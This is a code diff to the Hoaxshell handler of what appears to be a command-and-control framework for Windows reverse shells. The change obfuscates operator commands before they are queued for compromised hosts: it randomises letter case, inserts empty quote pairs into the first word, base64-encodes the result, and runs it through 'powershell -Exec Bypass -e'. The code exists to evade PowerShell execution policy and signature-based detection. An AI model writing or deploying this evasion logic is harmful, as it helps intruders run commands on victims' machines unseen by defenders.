@@ -748,13 +748,29 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							Hoaxshell.prompt_ready = False
 							
 							if is_remote_shell:
-								command_unobfuscated = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
-								command_unencoded = "-Exec Bypass "+"".join(choice((str.upper, str.lower))(c) for c in command_unobfuscated)
-								command = "powershell -e " + base64.b64encode(command_unencoded.encode('utf16')[2:]).decode()
+								first_word = user_input.split()[0]
+								y = ""
+								for x in "".join(choice((str.upper, str.lower))(c) for c in first_word):
+									y = y+x+'""'
+								if len(user_input.split())>1:
+									command_unencoded = y+" "+user_input.split(' ', 1)[1]
+								else:
+									command_unencoded = y
+								command2 = "powershell -Exec Bypass -e " + base64.b64encode(command_unencoded.encode('utf16')[2:]).decode()
+								command = command2 + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
 								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
 								
-							else:	
-								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
+							else:
+								first_word = user_input.split()[0]
+								y = ""
+								for x in "".join(choice((str.upper, str.lower))(c) for c in first_word):
+									y = y+x+'""'
+								if len(user_input.split())>1:
+									command_unencoded = y+" "+user_input.split(' ', 1)[1]
+								else:
+									command_unencoded = y
+								command2 = "powershell -Exec Bypass -e " + base64.b64encode(command_unencoded.encode('utf16')[2:]).decode()
+								Hoaxshell.command_pool[Hoaxshell.active_shell].append(command2)
 
 						else:
 							print(f'\r[{INFO}] No active session.')		
